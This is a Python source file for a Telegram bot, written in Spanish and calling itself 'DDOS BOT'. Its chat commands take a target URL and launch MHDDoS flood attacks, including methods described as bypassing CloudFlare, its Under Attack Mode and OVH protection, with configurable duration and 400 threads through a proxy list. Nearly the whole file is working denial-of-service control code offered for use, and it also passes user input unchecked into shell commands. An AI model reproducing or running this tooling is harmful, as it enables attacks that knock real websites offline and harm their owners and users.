import asyncio
import logging
import os
import subprocess
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from dotenv import load_dotenv

# Cargar variables de entorno
load_dotenv()

# Configure logging
logging.basicConfig(level=logging.INFO)

# Telegram token
token = os.getenv('TELEGRAM_TOKEN')
bot_number = os.getenv('NUM')

# Verificar que el token existe
if not token:
    raise ValueError("❌ ERROR: TELEGRAM_TOKEN no está configurado. Verifica tu archivo .env")

print(f"✅ Token configurado correctamente")
print(f"✅ Bot number: {bot_number}")
print(f"✅ Bot iniciando: @Botnetban_bot")

# Initialize bot and dispatcher
bot = Bot(token=token)
dp = Dispatcher()

# Global variable for attack duration
s = 360

# Start command
@dp.message(Command("start"))
async def start_command(message: types.Message):
    await message.answer(f"🚀 DDOS BOT {bot_number}\n\nUse /help para ver comandos disponibles")

# Help command
@dp.message(Command("help"))
async def help_command(message: types.Message):
    help_text = """
🤖 **COMANDOS DISPONIBLES:**
/start - Iniciar el bot
/help - Mostrar esta ayuda
/t [segundos] - Configurar tiempo de ataque (ej: /t 60)
/ddos [url] - Ataque GET
/bot [url] - Ataque BOT (como Google)
/stress [url] - Ataque STRESS
/cfb [url] - Ataque CloudFlare Bypass
/cfbuam [url] - Ataque CloudFlare UAM Bypass
/tor [url] - Ataque TOR
/ovh [url] - Ataque OVH Bypass
    """
    await message.answer(help_text, parse_mode="Markdown")

# Time setting command
@dp.message(Command("t"))
async def tmps_command(message: types.Message):
    global s
    try:
        s = int(message.text.replace('/t', '').strip())
        await message.answer(f"⏰ Tiempo configurado: {s} segundos")
    except ValueError:
        await message.answer("❌ Error: Por favor ingresa un número válido (ej: /t 60)")

# DDOS attack function
def ddos_start(url):
    subprocess.call(f'python3 ~/MHDDoS/start.py GET {url} 1 400 mhddos_proxy/list 10000 {s}', 
                   stdout=subprocess.PIPE, shell=True)

# DDOS command
@dp.message(Command("ddos"))
async def ddos_command(message: types.Message):
    url = message.text.replace('/ddos', '').strip()
    if not url:
        await message.answer("❌ Error: Debes especificar una URL (ej: /ddos https://ejemplo.com)")
        return
        
    await message.answer(f"⚡ METHOD: GET\n🎯 Target: {url}\n⏰ Time: {s}s\n🧵 Threads: 400")
    
    # Run in thread to avoid blocking
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, ddos_start, url)
    await message.answer("✅ Ataque GET iniciado")

# Generic attack function
async def run_attack(message: types.Message, method: str, description: str):
    url = message.text.replace(f'/{method.lower()}', '').strip()
    if not url:
        await message.answer(f"❌ Error: Debes especificar una URL (ej: /{method.lower()} https://ejemplo.com)")
        return
        
    await message.answer(f"⚡ METHOD: {method}\n🎯 Target: {url}\n📝 {description}\n⏰ Time: {s}s\n🧵 Threads: 400")
    
    def execute_attack():
        try:
            process = subprocess.Popen(
                f'python3 ~/MHDDoS/start.py {method} {url} 1 400 mhddos_proxy/list 10000 {s}',
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                shell=True,
                text=True
            )
            output, error = process.communicate()
            return output if not error else f'Error: {error}'
        except Exception as e:
            return f'Exception: {str(e)}'
    
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, execute_attack)
    
    if result:
        if len(result) > 4000:
            for i in range(0, len(result), 4000):
                await message.answer(f"```\n{result[i:i+4000]}\n```", parse_mode="Markdown")
        else:
            await message.answer(f"```\n{result}\n```", parse_mode="Markdown")

# Attack commands
@dp.message(Command("bot"))
async def google_bot_command(message: types.Message):
    await run_attack(message, "BOT", "BOT: Like Google bot")

@dp.message(Command("stress"))
async def stress_command(message: types.Message):
    await run_attack(message, "STRESS", "STRESS: Send HTTP Packet With High Byte")

@dp.message(Command("cfb"))
async def cfb_command(message: types.Message):
    await run_attack(message, "CFB", "CFB: CloudFlare Bypass (Ajoute des user-agents)")

@dp.message(Command("cfbuam"))
async def cfbuam_command(message: types.Message):
    await run_attack(message, "CFBUAM", "CFBUAM: CloudFlare Under Attack Mode Bypass")

@dp.message(Command("tor"))
async def tor_command(message: types.Message):
    await run_attack(message, "TOR", "TOR: Bypass onion website")

@dp.message(Command("ovh"))
async def ovh_command(message: types.Message):
    await run_attack(message, "OVH", "OVH: Bypass OVH")

# Main function
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
